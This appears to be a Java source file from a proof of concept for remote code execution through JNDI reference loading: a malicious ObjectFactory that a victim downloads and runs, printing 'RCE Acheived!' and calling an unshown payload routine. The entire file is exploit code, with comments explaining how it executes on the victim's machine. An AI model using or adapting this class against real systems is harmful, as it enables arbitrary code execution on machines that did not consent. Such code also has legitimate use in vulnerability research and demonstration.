// Factory class for RCE
//
// The victim will download this `FactoryClass` in an attempt to construct a
// `MadeClass` object. In doing so, it will call the `getObjectInstance` method.
// Normally, this would return the object pointed to in the registry.
//
// However, this code is executed on the victim, and thus provides a vector for
// remote code execution.


import javax.naming.spi.ObjectFactory;

import java.util.Hashtable;
import javax.naming.Name;
import javax.naming.Context;


public class FactoryClass implements ObjectFactory {
    @Override
    public MadeClass getObjectInstance(
        Object obj,
        Name name,
        Context nameCtx,
        Hashtable<?,?> env
    ) {

        // Add instrumentation
        System.out.println("RCE Acheived!");
        System.out.println("name:    " + name   );
        System.out.println("nameCtx: " + nameCtx);
        System.out.println("env:     " + env    );
        System.out.println("obj:     " + obj    );

        // Do whatever we want
        RCEMain.rceMain();

        // We could choose not to return
        // However, the caller is expecting an object of type MadeClass. I
        //  choose to give them something. It might be useful for further
        //  instrumentation.
        return new MadeClass();
    }
}
